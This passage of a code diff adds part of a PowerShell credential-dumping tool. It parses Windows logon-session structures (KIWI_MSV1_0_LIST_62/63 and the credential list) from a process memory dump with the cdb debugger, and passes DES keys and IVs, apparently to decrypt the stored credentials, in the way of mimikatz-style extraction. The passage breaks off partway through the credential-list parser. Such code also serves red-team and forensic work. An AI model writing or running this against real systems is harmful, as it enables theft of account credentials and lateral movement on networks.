+    $logontime = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $LogonServer.Position = $InitialPosition
+    $LogonServer.Length = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $LogonServer.MaxLength = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+    $LogonServer.Buffer = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $CredentialListPtr = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+    if($CredentialListPtr -eq "0000000000000000")
+        {
+        $PKIWI_MSV1_0_CREDENTIAL_LIST = "N/A"
+        }
+    else
+        {
+        $PKIWI_MSV1_0_CREDENTIAL_LIST = Parse-KIWI_MSV1_0_CREDENTIAL_LIST -InitialPosition (Get-Pattern -Address $CredentialListPtr -CdbProgramPath $PathToCDP -DMPPath $PathToDMP) -StartAddress $CredentialListPtr -DESKey $DESKey -IV $IV -PathToCDP $PathToCDP -PathToDMP $PathToDMP
+
+        }
+    
+    $unk19 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk20 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk21 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk22 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk23 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk24 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk25 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk26 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded -AllignmentOffset 8);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded -AllignmentOffset 8)
+
+    #input('CredentialManager\n' + hexdump(reader.peek(0x100)))
+    $unk27 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk28 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8 
+
+    $unk29 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $CredentialManager = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes #PVOID(reader) - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8 
+
+        $KIWI_MSV1_0_LIST_63 = New-Object -Type psobject -Property (@{
+            "flink" = $flink
+            "blink" = $blink
+            "unk0" = $unk0
+            "unk1" = $unk1
+            "unk2" = $unk2
+            "unk3" = $unk3
+            "unk4" = $unk4
+            "unk5" = $unk5
+            "hSemaphore6" = $hSemaphore6
+            "unk7" = $unk7
+            "hSemaphore8" = $hSemaphore8
+            "unk9" = $unk9
+            "unk10" = $unk10
+            "unk11" = $unk11
+            "unk12" = $unk12
+            "unk13" = $unk13
+            "LocallyUniqueIdentifier" = $LocallyUniqueIdentifier
+            "SecondaryLocallyUniqueIdentifier" = $SecondaryLocallyUniqueIdentifier
+            "username" = $username
+            "Domaine" = $Domaine
+            "unk14" = $unk14
+            "Type" = $Type
+            "PSID" = $PSID
+            "LogonType" = $LogonType
+            "unk18" = $unk18
+            "logontime" = $logontime
+            "LogonServer" = $LogonServer
+            "CredentialListPt" = $CredentialListPt
+            "PKIWI_MSV1_0_CREDENTIAL_LIST" = $PKIWI_MSV1_0_CREDENTIAL_LIST
+            "unk19" = $unk19
+            "unk20" = $unk20
+            "unk21" = $unk21
+            "unk22" = $unk22
+            "unk23" = $unk23
+            "unk24" = $unk24
+            "unk25" = $unk25
+            "unk26" = $unk26
+            "unk27" = $unk27
+            "unk28" = $unk28
+            "unk29" = $unk29
+            "CredentialManager" = $CredentialManager
+            })
+        return  $KIWI_MSV1_0_LIST_63
+    }
+
+    function Parse-KIWI_MSV1_0_LIST_62
+    {
+    Param(
+        [int64]$InitialPosition,
+        $StartAddress,
+        $DESKey,
+        $IV,
+        $PathToCDP, 
+        $PathToDMP
+    )
+
+    $BytesAdded = 0
+
+    $KIWI_MSV1_0_LIST_62 = New-Object -Type psobject -Property (@{
+            "flink" = $null
+            "blink" = $null
+            "unk0" = $null
+            "unk1" = $null
+            "unk2" = $null
+            "unk3" = $null
+            "unk4" = $null
+            "unk5" = $null
+            "hSemaphore6" = $null
+            "unk7" = $null
+            "hSemaphore8" = $null
+            "unk9" = $null
+            "unk10" = $null
+            "unk11" = $null
+            "unk12" = $null
+            "unk13" = $null
+            "LocallyUniqueIdentifier" = $null
+            "SecondaryLocallyUniqueIdentifier" = $null
+            "username" = $null
+            "Domaine" = $null
+            "unk14" = $null
+            "Type" = $null
+            "PSID" = $null
+            "LogonType" = $null
+            "unk18" = $null
+            "logontime" = $null
+            "LogonServer" = $null
+            "CredentialListPt" = $null
+            "PKIWI_MSV1_0_CREDENTIAL_LIST" = $null
+            "unk19" = $null
+            "unk20" = $null
+            "unk21" = $null
+            "unk22" = $null
+            "unk23" = $null
+            "unk24" = $null
+            "unk25" = $null
+            "unk26" = $null
+            "unk27" = $null
+            "unk28" = $null
+            "unk29" = $null
+            "CredentialManager" = $null
+            })
+
+    $username = New-Object -Type psobject -Property (@{
+                "Position" = $Null
+                "Length" =  $null # 2 Bytes
+                "MaxLength" = $null # 2 Bytes
+                "Buffer" = $null # 8 Bytes
+                })
+
+    $Domaine = New-Object -Type psobject -Property (@{
+                "Position" = $Null
+                "Length" =  $null # 2 Bytes
+                "MaxLength" = $null # 2 Bytes
+                "Buffer" = $null # 8 Bytes
+                })
+
+    $Type = New-Object -Type psobject -Property (@{
+                "Position" = $Null
+                "Length" =  $null # 2 Bytes
+                "MaxLength" = $null # 2 Bytes
+                "Buffer" = $null # 8 Bytes
+                })
+
+    $LogonServer = New-Object -Type psobject -Property (@{
+                "Position" = $Null
+                "Length" =  $null # 2 Bytes
+                "MaxLength" = $null # 2 Bytes
+                "Buffer" = $null # 8 Bytes
+                })
+
+    $PSID = $null
+
+    $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
+    $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
+    $fileReader.BaseStream.Position=$InitialPosition
+
+    $flink = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = 8
+
+    $blink = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk0 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk1 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+
+    $unk2 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk3 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')#ULONG(reader).value - 4 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk4 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')#ULONG(reader).value - 4 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk5 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')#ULONG(reader).value - 4 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+
+    $hSemaphore6 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #HANDLE(reader).value - evtl. 4 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk7 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $hSemaphore8 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #HANDLE(reader).value - evtl. 4 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk9 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk10 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk11 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #ULONG(reader).value - 4 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk12 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #ULONG(reader).value - 4 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk13 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $LocallyUniqueIdentifier = Get-LUID ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $SecondaryLocallyUniqueIdentifier = Get-LUID ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $username.Position = $InitialPosition
+    $username.Length = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $username.MaxLength = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+
+    $username.Buffer = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $Domaine.Position = $InitialPosition
+    $Domaine.Length = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $Domaine.MaxLength = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+
+    $Domaine.Buffer = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk14 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk15 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $Type.Position = $InitialPosition
+    $Type.Length = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $Type.MaxLength = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+
+    $Type.Buffer = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $PSID = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $LogonType = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+
+    $unk18 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $session = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded -AllignmentOffset 8);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded -AllignmentOffset 8)
+
+    $logontime = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $LogonServer.Position = $InitialPosition
+    $LogonServer.Length = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $LogonServer.MaxLength = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+
+    $LogonServer.Buffer = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    
+    $CredentialListPtr = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+    if($CredentialListPtr -eq "0000000000000000")
+        {
+        $PKIWI_MSV1_0_CREDENTIAL_LIST = "N/A"
+        }
+    else
+        {
+        $PKIWI_MSV1_0_CREDENTIAL_LIST = Parse-KIWI_MSV1_0_CREDENTIAL_LIST -InitialPosition (Get-Pattern -Address $CredentialListPtr -CdbProgramPath $PathToCDP -DMPPath $PathToDMP) -StartAddress $CredentialListPtr -DESKey $DESKey -IV $IV -PathToCDP $PathToCDP -PathToDMP $PathToDMP
+        }
+
+    $unk19 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk20 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk21 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk22 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk23 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk24 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk25 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk26 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded -AllignmentOffset 8);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded -AllignmentOffset 8)
+
+    $unk27 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk28 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8 
+
+    $unk29 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $CredentialManager = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes #PVOID(reader) - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $KIWI_MSV1_0_LIST_62 = New-Object -Type psobject -Property (@{
+        "flink" = $flink
+        "blink" = $blink
+        "unk0" = $unk0
+        "unk1" = $unk1
+        "unk2" = $unk2
+        "unk3" = $unk3
+        "unk4" = $unk4
+        "unk5" = $unk5
+        "hSemaphore6" = $hSemaphore6
+        "unk7" = $unk7
+        "hSemaphore8" = $hSemaphore8
+        "unk9" = $unk9
+        "unk10" = $unk10
+        "unk11" = $unk11
+        "unk12" = $unk12
+        "unk13" = $unk13
+        "LocallyUniqueIdentifier" = $LocallyUniqueIdentifier
+        "SecondaryLocallyUniqueIdentifier" = $SecondaryLocallyUniqueIdentifier
+        "username" = $username
+        "Domaine" = $Domaine
+        "unk14" = $unk14
+        "Type" = $Type
+        "PSID" = $PSID
+        "LogonType" = $LogonType
+        "unk18" = $unk18
+        "logontime" = $logontime
+        "LogonServer" = $LogonServer
+        "CredentialListPt" = $CredentialListPt
+        "PKIWI_MSV1_0_CREDENTIAL_LIST" = $PKIWI_MSV1_0_CREDENTIAL_LIST
+        "unk19" = $unk19
+        "unk20" = $unk20
+        "unk21" = $unk21
+        "unk22" = $unk22
+        "unk23" = $unk23
+        "unk24" = $unk24
+        "unk25" = $unk25
+        "unk26" = $unk26
+        "unk27" = $unk27
+        "unk28" = $unk28
+        "unk29" = $unk29
+        "CredentialManager" = $CredentialManager
+        })
+    
+    return  $KIWI_MSV1_0_LIST_62
+    }
+    function Parse-KIWI_MSV1_0_CREDENTIAL_LIST
+    {
+    Param(
+        $InitialPosition,
+        $StartAddress,
+        $DESKey,
+        $IV,
+        $PathToCDP, 
+        $PathToDMP
+    )
+
+    $BytesAdded = 0
+
+    $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
+    $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
+
+    $KIWI_MSV1_0_CREDENTIAL_LIST = New-Object -Type psobject -Property (@{
+            "flink" = $null
+            "AuthenticationPackageId"=$null
+            "PrimaryCredentials_ptr"= $null
+            "PrimaryCredentials_data" =$null
+            })
+
+        $fileReader.BaseStream.Position=$InitialPosition
+        $flink = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+        $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+        $BytesAdded = $BytesAdded + 8
+        $AuthenticationPackageId = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
